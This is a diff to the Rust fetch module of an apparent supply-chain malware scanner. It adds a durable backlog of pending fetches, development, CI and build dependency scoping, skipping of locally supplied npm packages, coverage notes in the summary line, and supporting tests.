@@ -52,6 +52,20 @@ use crate::hosts::{self, UrlHost};
 use crate::output::{Rgb, fg};
 use crate::provenance::RegistryProvenance;
 
+#[path = "fetch_pending.rs"]
+mod pending;
+static PENDING: OnceLock<Arc<pending::Store>> = OnceLock::new();
+
+/// Configure an opt-in durable fetch backlog, rejecting unreadable state.
+/// # Errors
+/// Returns an error for corrupt, unsupported, or unreadable backlog files.
+pub fn configure_pending(path: &Path) -> std::io::Result<()> {
+    let store = pending::Store::open(path)?;
+    PENDING
+        .set(Arc::new(store))
+        .map_err(|_store| std::io::Error::other("fetch backlog already configured"))
+}
+
 /// Default fetch recursion depth — the number of hops followed from the root.
 /// `2` reaches a stage-3 payload (root → stage-2 → stage-3), since multi-stage
 /// `curl | bash` droppers are the common case.
@@ -507,6 +521,10 @@ pub struct FetchPolicy {
     /// Applies to fetched dependencies only; a directly-scanned artifact is
     /// always analyzed.
     pub host_platform_only: bool,
+    /// Audit development-only locked dependencies; true preserves full coverage.
+    pub include_dev_dependencies: bool,
+    /// Analyze every pinned release, preserving separate version constraints.
+    pub all_versions: bool,
 }
 
 impl Default for FetchPolicy {
@@ -524,6 +542,8 @@ impl Default for FetchPolicy {
             max_duration: DEFAULT_FETCH_TIMEOUT,
             transitive_deps: false,
             host_platform_only: true,
+            include_dev_dependencies: true,
+            all_versions: false,
         }
     }
 }
@@ -1815,6 +1835,11 @@ struct FetchSession {
     registry_outcomes: BTreeMap<String, (u64, u64)>,
     /// Set when `SCAN_FETCH_ONLY` has stopped the run.
     stopped: bool,
+    root_sha: String,
+    current_hop: u8,
+    pending_error: Option<String>,
+    pending: Option<Arc<pending::Store>>,
+    local_coverage: HashMap<(String, String), String>,
 }
 
 impl FetchSession {
@@ -1831,6 +1856,7 @@ impl FetchSession {
         let mut opts = AnalysisOptions {
             skip_predicate: dep_skip_predicate(),
             rizin_timeout: crate::engine::rizin_timeout(),
+            rizin_retry_timeout: crate::engine::rizin_retry_timeout(),
             ..AnalysisOptions::default()
         };
         crate::engine::add_zip_passwords(&mut opts, zip_passwords);
@@ -1885,24 +1911,85 @@ impl FetchSession {
             out: FetchOutcome::default(),
             registry_outcomes: BTreeMap::new(),
             stopped: false,
+            root_sha: report
+                .files
+                .first()
+                .map(|f| f.sha256.clone())
+                .unwrap_or_default(),
+            current_hop: 0,
+            pending_error: None,
+            pending: PENDING.get().cloned(),
+            local_coverage: HashMap::new(),
         }
     }
 
     /// Walk the hops: each works from the references found inside the
     /// previous hop's payloads.
     fn run(&mut self, report: &mut AnalysisReport, mut worklist: Vec<Group>) {
-        for hop in 0..self.policy.depth.saturating_add(MAX_REDIRECT_HOPS) {
-            worklist.retain(|(sha, _)| {
-                hop < self
-                    .policy
-                    .depth
-                    .saturating_add(self.redirect_credit.get(sha).copied().unwrap_or(0))
-            });
-            if worklist.is_empty() || self.deadline.passed() {
+        let mut resumed: BTreeMap<u8, Vec<Group>> = BTreeMap::new();
+        if let Some(store) = self.pending.as_ref() {
+            match store.entries(&self.root_sha) {
+                Ok(entries) => {
+                    for entry in entries {
+                        self.redirect_credit
+                            .entry(entry.source_sha.clone())
+                            .and_modify(|credit| *credit = (*credit).max(entry.redirect_credit))
+                            .or_insert(entry.redirect_credit);
+                        resumed
+                            .entry(entry.hop)
+                            .or_default()
+                            .push((entry.source_sha, vec![entry.reference]));
+                    }
+                }
+                Err(error) => self.pending_error = Some(error.to_string()),
+            }
+        }
+        let end = self.policy.depth.saturating_add(MAX_REDIRECT_HOPS);
+        for hop in 0..end {
+            self.current_hop = hop;
+            worklist.extend(resumed.remove(&hop).unwrap_or_default());
+            let mut allowed = Vec::new();
+            for group in worklist {
+                if hop
+                    < self
+                        .policy
+                        .depth
+                        .saturating_add(self.redirect_credit.get(&group.0).copied().unwrap_or(0))
+                {
+                    allowed.push(group);
+                } else {
+                    self.defer_groups(&[group], hop, "depth limit");
+                }
+            }
+            worklist = allowed;
+            if self.deadline.passed() {
+                self.defer_groups(&worklist, hop, "fetch timeout");
+                worklist.clear();
                 break;
             }
-            // Build-host code runs before the package's runtime entry point.
-            // Stable ordering preserves deterministic ties and existing budgets.
+            if worklist.is_empty() {
+                continue;
+            }
+            let local = LocalNpmPackages::from_report(report);
+            let mut covered = Vec::new();
+            for (source, refs) in &mut worklist {
+                refs.retain(|reference| {
+                    if !self.policy.wants_at(reference.kind, hop) { return true; }
+                    let Some(path) = local.declared_coverage(report, source, reference) else { return true; };
+                    if reference.pinned_hash.is_some() {
+                        self.local_coverage.insert((source.clone(), locator(reference).to_owned()), path);
+                        return true;
+                    }
+                    let mut record = FetchRecord::terminal(locator(reference).to_owned(), Outcome::Skipped);
+                    record.source_sha256 = Some(source.clone()); record.source_offset = reference.offset;
+                    record.kind = reference.kind; record.context = reference.context.clone();
+                    record.coverage_note = Some(format!("supplied code already analyzed: {path}; registry archive identity not verified"));
+                    self.out.records.push(record);
+                    covered.push(self.pending_entry(source, reference, hop, "supplied code"));
+                    false
+                });
+            }
+            self.checkpoint(&[], &covered);
             for (_, refs) in &mut worklist {
                 refs.sort_by_key(dependency_execution_priority);
             }
@@ -1917,6 +2004,56 @@ impl FetchSession {
             if self.stopped {
                 break;
             }
+        }
+        self.defer_groups(&worklist, end, "depth limit");
+        for (hop, groups) in resumed {
+            self.defer_groups(&groups, hop, "depth limit or fetch timeout");
+        }
+    }
+
+    fn pending_entry(
+        &self,
+        source: &str,
+        reference: &Reference,
+        hop: u8,
+        reason: &str,
+    ) -> pending::Entry {
+        pending::Entry {
+            root_sha: self.root_sha.clone(),
+            source_sha: source.to_owned(),
+            hop,
+            reference: reference.clone(),
+            reason: reason.to_owned(),
+            redirect_credit: self.redirect_credit.get(source).copied().unwrap_or(0),
+        }
+    }
+    fn checkpoint(&mut self, additions: &[pending::Entry], completed: &[pending::Entry]) {
+        if let Some(store) = self.pending.as_ref()
+            && let Err(error) = store.update(additions, completed)
+        {
+            tracing::error!(%error, "fetch backlog checkpoint failed");
+            self.pending_error = Some(error.to_string());
+        }
+    }
+    fn defer_groups(&mut self, groups: &[Group], hop: u8, reason: &str) {
+        let entries: Vec<_> = groups
+            .iter()
+            .flat_map(|(sha, refs)| {
+                refs.iter()
+                    .filter(|r| r.is_fetch_target() && self.policy.wants(r.kind))
+                    .map(|r| self.pending_entry(sha, r, hop, reason))
+            })
+            .collect();
+        self.checkpoint(&entries, &[]);
+        for entry in entries {
+            let mut record =
+                FetchRecord::terminal(locator(&entry.reference).to_owned(), Outcome::Skipped);
+            record.source_sha256 = Some(entry.source_sha);
+            record.source_offset = entry.reference.offset;
+            record.kind = entry.reference.kind;
+            record.context = entry.reference.context;
+            record.coverage_note = Some(format!("pending: {reason}; hop={hop}"));
+            self.out.records.push(record);
         }
     }
 
@@ -1975,7 +2112,7 @@ impl FetchSession {
                     exhausted = true;
                     break;
                 };
-                let selected = self.select(refs, hop, &mut dropped_old_versions);
+                let selected = self.select(&source_sha, refs, hop, &mut dropped_old_versions);
                 if selected.is_empty() {
                     continue;
                 }
@@ -2000,6 +2137,8 @@ impl FetchSession {
                 self.merge_group(report, group, analysis, &mut next);
             }
         }
+        let leftovers: Vec<_> = groups.collect();
+        self.defer_groups(&leftovers, hop, "fetch timeout");
         if dropped_old_versions > 0 {
             tracing::info!(
                 skipped = dropped_old_versions,
@@ -2013,15 +2152,36 @@ impl FetchSession {
     /// seen. Selection is by [`RefKind`], so a command-mentioned package
     /// (`packages`) is distinct from a declared dependency (`deps`) even though
     /// both are PURLs.
-    fn select(&mut self, refs: Vec<Reference>, hop: u8, dropped_old: &mut usize) -> Vec<Reference> {
+    fn select(
+        &mut self,
+        source_sha: &str,
+        refs: Vec<Reference>,
+        hop: u8,
+        dropped_old: &mut usize,
+    ) -> Vec<Reference> {
         let mut selected = Vec::new();
         for r in refs {
+            if !self.policy.include_dev_dependencies
+                && r.context
+                    .as_ref()
+                    .is_some_and(|c| c.scope == filefacts::DependencyScope::Development)
+            {
+                let mut record = FetchRecord::terminal(locator(&r).to_owned(), Outcome::Skipped);
+                record.source_sha256 = Some(source_sha.to_owned());
+                record.source_offset = r.offset;
+                record.kind = r.kind;
+                record.context = r.context.clone();
+                record.coverage_note =
+                    Some("development-only dependency excluded by --fetch-dev-deps=false".into());
+                self.out.records.push(record);
+                continue;
+            }
             if self.wanted(&r, hop)
                 && self.fetchable(&r)
                 && !self.off_host(&r)
                 && self.newest_version(&r, dropped_old)
                 && !self.superseded(&r)
-                && self.seen.insert(locator(&r).to_owned())
+                && self.seen.insert(fetch_work_key(&r))
             {
                 selected.push(r);
             }
@@ -2030,6 +2190,20 @@ impl FetchSession {
     }
 
     fn wanted(&self, r: &Reference, hop: u8) -> bool {
+        if r.context
+            .as_ref()
+            .is_some_and(|c| c.scope == filefacts::DependencyScope::Ci)
+            && !self.policy.ci
+        {
+            return false;
+        }
+        if !self.policy.include_dev_dependencies
+            && r.context
+                .as_ref()
+                .is_some_and(|c| c.scope == filefacts::DependencyScope::Development)
+        {
+            return false;
+        }
         let wanted = self.policy.wants_at(r.kind, hop);
         if !wanted && self.policy.wants(r.kind) {
             tracing::debug!(
@@ -2109,6 +2283,9 @@ impl FetchSession {
     /// materialization, no fetch (operator policy 2, 2026-07-30). Never silent:
     /// each skip logs at debug, the hop logs one count at info.
     fn newest_version(&self, r: &Reference, dropped_old: &mut usize) -> bool {
+        if self.policy.all_versions {
+            return true;
+        }
         let Some((key, version)) = versioned_purl(locator(r)) else {
             return true;
         };
@@ -2222,6 +2399,11 @@ impl FetchSession {
                 landed: Vec::new(),
             };
         }
+        let entries: Vec<_> = selected
+            .iter()
+            .map(|r| self.pending_entry(&source_sha, r, self.current_hop, "in progress"))
+            .collect();
+        self.checkpoint(&entries, &[]);
         let mut slots: Vec<Option<(FetchRecord, Standing)>> = vec![None; selected.len()];
         let mut deps = Vec::new();
         let mut urls = Vec::new();
@@ -2248,7 +2430,7 @@ impl FetchSession {
             dep_records.into_iter().chain(url_records),
             &mut slots,
         );
-        let landed: Vec<Landed> = selected
+        let mut landed: Vec<Landed> = selected
             .into_iter()
             .zip(slots)
             .filter_map(|(reference, slot)| {
@@ -2263,7 +2445,19 @@ impl FetchSession {
         // finalizes any budget-clipped edge the live callback never saw;
         // re-settling a callback-landed row is idempotent) and print the
         // streamed line.
-        for l in &landed {
+        for l in &mut landed {
+            if let Some(path) = self
+                .local_coverage
+                .get(&(source_sha.clone(), locator(&l.reference).to_owned()))
+            {
+                let pin = if l.record.pin_verified == Some(true) {
+                    "archive pin verified"
+                } else {
+                    "archive pin unverified"
+                };
+                l.record.coverage_note =
+                    Some(format!("supplied code already analyzed: {path}; {pin}"));
+            }
             self.reporter.landed(&l.reference, &l.record);
             let notice = if l.reference.kind == RefKind::UrlFetch {
                 &url_notice
@@ -2312,7 +2506,7 @@ impl FetchSession {
             max_count: grant.fetches,
             max_bytes: grant.bytes,
         };
-        let records = match class {
+        let mut records = match class {
             FetchClass::Deps => fetch_references_with(
                 refs,
                 source_sha,
@@ -2341,6 +2535,14 @@ impl FetchSession {
                 )
             }
         };
+        for record in &mut records {
+            if matches!(record.outcome, Outcome::BudgetExceeded) {
+                record.coverage_note = Some(format!(
+                    "budget exceeded: {notice}; request allowance={}; byte allowance={}",
+                    grant.fetches, grant.bytes
+                ));
+            }
+        }
         let spent = live_fetch_usage(&records);
         TOTAL_BUDGET.settle(grant, spent);
         self.budget.spend(class, spent);
@@ -2421,7 +2623,7 @@ impl FetchSession {
         let GroupFetch {
             source_sha,
             registries,
-            landed,
+            mut landed,
         } = group;
         let GroupAnalysis {
             registries: subs,
@@ -2434,11 +2636,60 @@ impl FetchSession {
         for (gated, sub) in registries.into_iter().zip(subs) {
             self.merge_registry_record(report, &source_sha, gated, sub, &mut registry_findings);
         }
-        for (l, payload) in landed.iter().zip(payloads) {
+        for (l, payload) in landed.iter_mut().zip(payloads) {
+            if payload.is_none()
+                && delivered_bytes(&l.record)
+                && matches!(l.standing, Standing::Analyze)
+            {
+                l.record.coverage_note = Some("analysis unavailable".into());
+            }
+            if payload
+                .as_ref()
+                .and_then(|p| p.sub.as_ref())
+                .is_some_and(|sub| {
+                    !sub.analysis_gaps.is_empty()
+                        || sub.files.iter().any(|f| !f.analysis_gaps.is_empty())
+                })
+            {
+                l.record.coverage_note = Some("analysis incomplete".into());
+            }
             if let Some(payload) = payload {
                 self.merge_landed(report, &source_sha, l, payload, &registry_findings, next);
             }
         }
+        let mut pending = Vec::new();
+        let mut completed = Vec::new();
+        for l in &landed {
+            let entry = self.pending_entry(
+                &source_sha,
+                &l.reference,
+                self.current_hop,
+                "fetch failed or budget exceeded",
+            );
+            if matches!(l.record.outcome, Outcome::BudgetExceeded)
+                || matches!(&l.record.outcome, Outcome::Failed(error) if error.is_retryable())
+                || matches!(
+                    l.record.coverage_note.as_deref(),
+                    Some("analysis incomplete" | "analysis unavailable")
+                )
+            {
+                pending.push(entry);
+            } else {
+                completed.push(entry);
+            }
+        }
+        self.checkpoint(&pending, &completed);
+        let discovered: Vec<_> = next
+            .iter()
+            .flat_map(|(sha, refs)| {
+                refs.iter()
+                    .filter(|r| r.is_fetch_target() && self.policy.wants(r.kind))
+                    .map(|r| {
+                        self.pending_entry(sha, r, self.current_hop.saturating_add(1), "discovered")
+                    })
+            })
+            .collect();
+        self.checkpoint(&discovered, &[]);
         self.out
             .records
             .extend(landed.into_iter().map(|l| l.record));
@@ -2598,7 +2849,9 @@ impl FetchSession {
                 .adopted
                 .insert(payload.content_sha.clone(), verdict.clone());
         }
-        next.extend(merge_payload(report, &mut self.graft, &l.record, payload));
+        let mut discovered = merge_payload(report, &mut self.graft, &l.record, payload);
+        inherit_dependency_context(&l.reference, &mut discovered);
+        next.extend(discovered);
     }
 
     /// `SCAN_FETCH_ONLY`: keep the edges of what was fetched, say how much, and
@@ -2629,7 +2882,15 @@ impl FetchSession {
 
     /// Close out the phase: settle the progress view and record, on each file
     /// that declared references, what became of them.
-    fn finish(self, report: &mut AnalysisReport) -> FetchOutcome {
+    fn finish(mut self, report: &mut AnalysisReport) -> FetchOutcome {
+        if let Some(error) = self.pending_error {
+            let mut record = FetchRecord::terminal(
+                "fetch backlog".into(),
+                Outcome::Failed(FetchError::Internal(error)),
+            );
+            record.coverage_note = Some("unfinished work could not be persisted".into());
+            self.out.records.push(record);
+        }
         self.reporter.finish(&self.out.records);
         attribute_reference_outcomes(report, &self.out.records, &self.registry_outcomes);
         self.out
@@ -3771,14 +4032,24 @@ fn superseded_by_pin(r: &Reference, pinned: &HashSet<String>) -> bool {
 }
 
 fn dependency_execution_priority(reference: &Reference) -> u8 {
-    if reference.source.contains("build-dependencies")
+    if reference
+        .context
+        .as_ref()
+        .is_some_and(|c| c.has_install_script || c.scope == filefacts::DependencyScope::Build)
+        || reference.source.starts_with("npm.scripts.")
+        || reference.source.contains("build-dependencies")
         || reference.source.contains("build-system.requires")
         || reference.source.contains("proc-macro")
     {
         0
     } else if reference.kind == RefKind::Command {
         1
-    } else if reference.source.contains("dev-dependencies") {
+    } else if reference
+        .context
+        .as_ref()
+        .is_some_and(|c| c.scope == filefacts::DependencyScope::Development)
+        || reference.source.contains("dev-dependencies")
+    {
         3
     } else {
         2
@@ -4187,8 +4458,29 @@ fn summary_line(records: &[FetchRecord]) -> String {
     let mut cached = 0u32;
     let mut failed = 0u32;
     let mut bytes = 0u64;
+    let mut pending = 0u32;
+    let mut local = 0u32;
+    let mut dev = 0u32;
+    let mut incomplete = 0u32;
     for rec in records {
         bytes += rec.size.unwrap_or(0);
+        let note = rec.coverage_note.as_deref().unwrap_or_default();
+        if matches!(
+            rec.outcome,
+            Outcome::BudgetExceeded | Outcome::Unresolved(_)
+        ) || note.starts_with("pending:")
+        {
+            pending += 1;
+        }
+        if note.starts_with("supplied code already analyzed:") {
+            local += 1;
+        }
+        if note.starts_with("development-only") {
+            dev += 1;
+        }
+        if matches!(note, "analysis incomplete" | "analysis unavailable") {
+            incomplete += 1;
+        }
         match &rec.outcome {
             Outcome::Ok | Outcome::PinMismatch | Outcome::UnverifiablePin if rec.is_cached() => {
                 cached += 1;
@@ -4211,10 +4503,24 @@ fn summary_line(records: &[FetchRecord]) -> String {
     if failed > 0 {
         parts.push(format!("{failed} failed"));
     }
+    for (count, label) in [
+        (pending, "pending"),
+        (local, "supplied locally"),
+        (dev, "development excluded"),
+        (incomplete, "analysis incomplete"),
+    ] {
+        if count > 0 {
+            parts.push(format!("{count} {label}"));
+        }
+    }
     parts.push(human_bytes(bytes));
     format!(
         "  {}  {}",
-        fg(Rgb(80, 220, 80), "\u{2713}"),
+        if failed + pending + incomplete > 0 {
+            fg(Rgb(220, 160, 80), "!")
+        } else {
+            fg(Rgb(80, 220, 80), "\u{2713}")
+        },
         fg(LABEL, &parts.join("  \u{b7}  "))
     )
 }
@@ -4356,6 +4662,19 @@ fn collect_references(
         if refs.is_empty() {
             continue;
         }
+        if is_ci_context(file) {
+            for reference in &mut refs {
+                let context = reference
+                    .context
+                    .get_or_insert(filefacts::DependencyContext {
+                        scope: filefacts::DependencyScope::Ci,
+                        optional: false,
+                        has_install_script: false,
+                        installed_path: None,
+                    });
+                context.scope = filefacts::DependencyScope::Ci;
+            }
+        }
         groups.push((file.sha256.clone(), refs));
     }
     if local_imports_skipped > 0 {
@@ -4389,11 +4708,24 @@ fn collect_references(
         // A provenance document names one artifact and catalogues many. The
         // string hunt cannot tell those apart, so it is replaced by the subject
         // this document is *about* — see `provenance_subject`.
-        let hunted = if is_provenance_document(&root.file_type, &name) {
+        let mut hunted = if is_provenance_document(&root.file_type, &name) {
             provenance_subject(&bytes).into_iter().collect()
         } else {
             find::references_in_bytes(&bytes, &name)
         };
+        if is_ci_context(root) {
+            for reference in &mut hunted {
+                let context = reference
+                    .context
+                    .get_or_insert(filefacts::DependencyContext {
+                        scope: filefacts::DependencyScope::Ci,
+                        optional: false,
+                        has_install_script: false,
+                        installed_path: None,
+                    });
+                context.scope = filefacts::DependencyScope::Ci;
+            }
+        }
         if !hunted.is_empty() {
             merge_into_root(&mut groups, &root.sha256, hunted);
         }
@@ -4698,6 +5030,7 @@ fn is_vendored_node_module(path: &str) -> bool {
 #[derive(Default)]
 struct LocalNpmPackages {
     roots: HashSet<String>,
+    declarations: HashMap<String, (String, String)>,
 }
 
 impl LocalNpmPackages {
@@ -4707,7 +5040,128 @@ impl LocalNpmPackages {
             .iter()
             .filter_map(|file| npm_package_root(&file.path))
             .collect();
-        Self { roots }
+        let mut declarations = HashMap::new();
+        let paths: HashSet<_> = report
+            .files
+            .iter()
+            .filter(|f| !f.analysis_gaps.is_empty())
+            .map(|f| f.path.replace('\\', "/"))
+            .collect();
+        let analyzed: HashSet<_> = report
+            .files
+            .iter()
+            .filter(|f| f.analysis_gaps.is_empty())
+            .map(|f| f.path.replace('\\', "/"))
+            .collect();
+        for file in &report.files {
+            let Some(root) = npm_package_root(&file.path) else {
+                continue;
+            };
+            let Some(view) = &file.filefacts else {
+                continue;
+            };
+            let Some(npm) = view.values.get("npm") else {
+                continue;
+            };
+            let Some(name) = npm.get("name").and_then(serde_json::Value::as_str) else {
+                continue;
+            };
+            let Some(version) = npm.get("version").and_then(serde_json::Value::as_str) else {
+                continue;
+            };
+            let targets: Vec<_> = view
+                .references
+                .iter()
+                .filter_map(|r| match &r.locator {
+                    RefLocator::Path(path)
+                        if r.kind == RefKind::Local && r.source.starts_with("package.json:") =>
+                    {
+                        Some(path)
+                    }
+                    _ => None,
+                })
+                .collect();
+            // A manifest/README alone is not supplied executable code. Require
+            // a captured entry point and all declared entry points, with no
+            // incomplete member under this package. Wildcard-only exports and
+            // implicit index.js deliberately remain external until established.
+            if targets.is_empty()
+                || !file.analysis_gaps.is_empty()
+                || paths
+                    .iter()
+                    .any(|path| path.starts_with(&format!("{root}/")))
+            {
+                continue;
+            }
+            let complete = targets.iter().all(|target| {
+                let Some(path) = safe_package_path(&root, target) else {
+                    return false;
+                };
+                analyzed.contains(&path)
+                    || (std::path::Path::new(&path).extension().is_none()
+                        && [".js", ".json", "/index.js"]
+                            .iter()
+                            .any(|ext| analyzed.contains(&format!("{path}{ext}"))))
+            });
+            if complete {
+                declarations.insert(root, (name.to_owned(), version.to_owned()));
+            }
+        }
+        Self {
+            roots,
+            declarations,
+        }
+    }
+
+    fn declared_coverage(
+        &self,
+        report: &AnalysisReport,
+        source_sha: &str,
+        reference: &Reference,
+    ) -> Option<String> {
+        if reference.kind != RefKind::Dependency {
+            return None;
+        }
+        let coordinate = Coordinate::of(locator(reference)).filter(|c| c.typ == "npm")?;
+        let version = coordinate.version?;
+        let package = npm_import_name(reference)?;
+        let sources: Vec<_> = report
+            .files
+            .iter()
+            .filter(|f| f.sha256 == source_sha)
+            .collect();
+        if sources.is_empty() {
+            return None;
+        }
+        let mut covered = Vec::new();
+        for source in sources {
+            let normalized = source.path.replace('\\', "/");
+            let directory = virtual_parent(&normalized)?;
+            let root = if let Some(installed) = reference
+                .context
+                .as_ref()
+                .and_then(|c| c.installed_path.as_ref())
+            {
+                safe_package_path(&directory, installed)?
+            } else {
+                let mut dir = directory;
+                loop {
+                    let candidate = safe_package_path(&dir, &format!("node_modules/{package}"))?;
+                    // A nearer installation shadows ancestors, even if it is
+                    // incomplete or has a different version.
+                    if self.roots.contains(&candidate) {
+                        break candidate;
+                    }
+                    dir = virtual_parent(&dir)?;
+                }
+            };
+            let (name, supplied_version) = self.declarations.get(&root)?;
+            if name != &package || supplied_version != version {
+                return None;
+            }
+            covered.push(root);
+        }
+        Some(covered.join(", "))
     }
 
     /// Mirror Node's package-level lookup: walk upward from the importing
@@ -4733,11 +5187,48 @@ impl LocalNpmPackages {
     }
 }
 
+/// A virtual member's parent stops at its archive boundary.
+fn virtual_parent(path: &str) -> Option<String> {
+    if let Some((archive, member)) = path.rsplit_once("!!") {
+        if member.is_empty() {
+            return None;
+        }
+        return Some(match member.rsplit_once('/') {
+            Some((parent, _)) => format!("{archive}!!{parent}"),
+            None => format!("{archive}!!"),
+        });
+    }
+    path.rsplit_once('/').map(|(parent, _)| parent.to_owned())
+}
+
+fn safe_package_path(root: &str, target: &str) -> Option<String> {
+    let target = target.replace('\\', "/");
+    if target.starts_with('/') || target.contains([':', '!', '*']) {
+        return None;
+    }
+    let mut components = Vec::new();
+    for part in target.split('/') {
+        match part {
+            "" | "." => {}
+            ".." => {
+                components.pop()?;
+            }
+            other => components.push(other),
+        }
+    }
+    (!components.is_empty()).then(|| {
+        let separator = if root.ends_with("!!") { "" } else { "/" };
+        format!("{root}{separator}{}", components.join("/"))
+    })
+}
+
 /// Return the virtual package root for an analyzed node_modules/package.json.
 fn npm_package_root(path: &str) -> Option<String> {
     let normalized = path.replace('\\', "/");
     let root = normalized.strip_suffix("/package.json")?;
-    let (_, package) = root.rsplit_once("/node_modules/")?;
+    let (_, package) = root
+        .rsplit_once("/node_modules/")
+        .or_else(|| root.rsplit_once("!!node_modules/"))?;
     let mut parts = package.split('/');
     let first = parts.next()?;
     let valid = if let Some(scope) = first.strip_prefix('@') {
@@ -4791,6 +5282,40 @@ fn merge_into_root(
             group.push(r);
         }
     }
+}
+
+/// Scope follows the edge into a dependency tree: runtime imports of a
+/// development tool are still development-only work for the scanned artifact.
+fn inherit_dependency_context(parent: &Reference, groups: &mut [Group]) {
+    let Some(parent) = &parent.context else {
+        return;
+    };
+    for (_, references) in groups {
+        for reference in references {
+            let context = reference
+                .context
+                .get_or_insert(filefacts::DependencyContext {
+                    scope: filefacts::DependencyScope::Runtime,
+                    optional: false,
+                    has_install_script: false,
+                    installed_path: None,
+                });
+            use filefacts::DependencyScope;
+            if parent.scope == DependencyScope::Ci
+                || (parent.scope == DependencyScope::Development
+                    && context.scope != DependencyScope::Ci)
+                || (parent.scope == DependencyScope::Build
+                    && context.scope == DependencyScope::Runtime)
+            {
+                context.scope = parent.scope;
+            }
+            context.optional |= parent.optional;
+        }
+    }
+}
+
+fn fetch_work_key(reference: &Reference) -> String {
+    format!("{}|{:?}", locator(reference), reference.pinned_hash)
 }
 
 /// A reference's locator as written — the key dedup, rows, memos, and
@@ -5015,6 +5540,8 @@ impl Payloads<'_> {
 fn corpus_hit_record(r: &Reference, source_sha: &str, sha: &str) -> FetchRecord {
     FetchRecord {
         source_sha256: (!source_sha.is_empty()).then(|| source_sha.to_owned()),
+        context: r.context.clone(),
+        coverage_note: None,
         source_offset: r.offset,
         kind: r.kind,
         locator: locator(r).to_owned(),
@@ -5241,7 +5768,20 @@ fn merge_payload(
             continue;
         }
         if let Some(view) = &file.filefacts {
-            let refs = find::references_from_facts(&view.values, &view.references);
+            let mut refs = find::references_from_facts(&view.values, &view.references);
+            if is_ci_context(file) {
+                for reference in &mut refs {
+                    let context = reference
+                        .context
+                        .get_or_insert(filefacts::DependencyContext {
+                            scope: filefacts::DependencyScope::Ci,
+                            optional: false,
+                            has_install_script: false,
+                            installed_path: None,
+                        });
+                    context.scope = filefacts::DependencyScope::Ci;
+                }
+            }
             if !refs.is_empty() {
                 next.push((file.sha256.clone(), refs));
             }
@@ -5433,6 +5973,8 @@ mod tests {
     fn fetched_record() -> FetchRecord {
         FetchRecord {
             source_sha256: Some("s".repeat(64)),
+            context: None,
+            coverage_note: None,
             source_offset: Some(17),
             kind: RefKind::Dependency,
             locator: "pkg:npm/held@0.0.1-security".to_string(),
@@ -5594,6 +6136,8 @@ mod tests {
     fn summary_line_omits_zero_counts() {
         let record = |outcome: Outcome, served: Served, size: Option<u64>| FetchRecord {
             source_sha256: None,
+            context: None,
+            coverage_note: None,
             source_offset: None,
             kind: RefKind::Dependency,
             locator: "pkg:npm/x".to_string(),
@@ -7253,6 +7797,8 @@ mod tests {
         };
         let rec_for = |locator: &str, url: &str| FetchRecord {
             source_sha256: None,
+            context: None,
+            coverage_note: None,
             source_offset: None,
             kind: RefKind::Dependency,
             locator: locator.to_string(),
@@ -7312,6 +7858,8 @@ mod tests {
     fn payload_name_prefers_url_basename_then_falls_back_to_hash() {
         let mut rec = FetchRecord {
             source_sha256: None,
+            context: None,
+            coverage_note: None,
             source_offset: None,
             kind: RefKind::Dependency,
             locator: "pkg:npm/x".to_string(),
@@ -7685,5 +8233,573 @@ mod tests {
             .collect();
         assert_eq!(grafted, [(6, Some(5), 2), (7, Some(6), 3)]);
         assert_eq!(graft.next_id, 8);
+    }
+}
+
+#[cfg(test)]
+mod dependency_gap_tests {
+    use super::*;
+    #[test]
+    fn real_compact_archive_retains_local_identity_entry_points_and_install_hooks() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("fixture.tar");
+        let members: [(&str, &[u8]); 3] = [
+            ("package-lock.json", br#"{"lockfileVersion":3,"packages":{"node_modules/tool":{"version":"1.0.0"}}}"#),
+            ("node_modules/tool/package.json", br#"{"name":"tool","version":"1.0.0","main":"index.js","scripts":{"postinstall":"npm install companion@2.0.0"}}"#),
+            ("node_modules/tool/index.js", b"module.exports = 7;\n"),
+        ];
+        let mut archive = tar::Builder::new(std::fs::File::create(&path).unwrap());
+        for (name, bytes) in members {
+            let mut header = tar::Header::new_ustar();
+            header.set_size(bytes.len() as u64);
+            header.set_mode(0o644);
+            header.set_cksum();
+            archive.append_data(&mut header, name, bytes).unwrap();
+        }
+        archive.finish().unwrap();
+        let mut supplied = cleave::Engine::empty()
+            .with_compact_members(true)
+            .analyze_file(&path, &AnalysisOptions::default())
+            .unwrap();
+        supplied.finalize();
+        let groups = collect_references(&supplied, &path, CiRefs::Skip);
+        assert!(
+            groups
+                .iter()
+                .flat_map(|(_, refs)| refs)
+                .any(|r| locator(r) == "pkg:npm/companion@2.0.0")
+        );
+        let (source, references) = groups
+            .iter()
+            .find(|(_, refs)| refs.iter().any(|r| locator(r) == "pkg:npm/tool@1.0.0"))
+            .unwrap();
+        let dependency = references
+            .iter()
+            .find(|r| locator(r) == "pkg:npm/tool@1.0.0")
+            .unwrap();
+        assert!(
+            LocalNpmPackages::from_report(&supplied)
+                .declared_coverage(&supplied, source, dependency)
+                .is_some()
+        );
+        let mut pass = session(
+            &supplied,
+            FetchPolicy {
+                deps: true,
+                depth: 1,
+                ..FetchPolicy::default()
+            },
+            None,
+        );
+        pass.run(
+            &mut supplied,
+            vec![(source.clone(), vec![dependency.clone()])],
+        );
+        let records = pass.finish(&mut supplied).records;
+        assert_eq!(records.len(), 1);
+        assert!(matches!(records[0].outcome, Outcome::Skipped));
+        assert!(
+            records[0]
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .contains("already analyzed")
+        );
+    }
+    fn reference() -> Reference {
+        Reference::new(
+            RefLocator::Purl("pkg:npm/tool@1.0.0".into()),
+            RefKind::Dependency,
+            "packages.node_modules/tool",
+            "node_modules/tool",
+        )
+    }
+    fn report(prefix: &str, entry: &str, code: bool) -> AnalysisReport {
+        let root = format!("{prefix}/node_modules/tool");
+        let mut files = vec![
+            serde_json::json!({"id":0,"path":format!("{prefix}/package-lock.json"),"file_type":"package_lock_json","sha256":"source","size":1,"depth":0}),
+            serde_json::json!({"id":1,"path":format!("{root}/package.json"),"file_type":"package_json","sha256":"manifest","size":1,"depth":1,
+                "filefacts":{"values":{"npm":{"name":"tool","version":"1.0.0"}},"references":[{"locator":{"path":entry},"kind":"local","source":"package.json:main","evidence":entry}]}}),
+        ];
+        if code {
+            files.push(serde_json::json!({"id":2,"path":format!("{root}/index.js"),"file_type":"javascript","sha256":"code","size":1,"depth":1}));
+        }
+        serde_json::from_value(serde_json::json!({"version":"3","files":files})).unwrap()
+    }
+    fn session(
+        report: &AnalysisReport,
+        policy: FetchPolicy,
+        store: Option<Arc<pending::Store>>,
+    ) -> FetchSession {
+        static RESOURCES: OnceLock<Resources> = OnceLock::new();
